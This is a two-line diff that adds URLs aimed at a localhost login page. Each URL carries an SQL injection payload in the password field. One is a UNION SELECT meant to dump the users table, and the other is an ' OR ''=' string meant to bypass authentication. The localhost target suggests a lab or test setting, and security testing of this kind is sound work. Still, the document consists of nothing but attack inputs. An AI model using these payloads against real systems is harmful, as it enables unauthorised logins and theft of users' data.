@@ -1,0 +1,2 @@
+http://localhost:8000/login?username=&password='union select * from users --
+http://localhost:8000/login?username=admin&password=' OR ''='
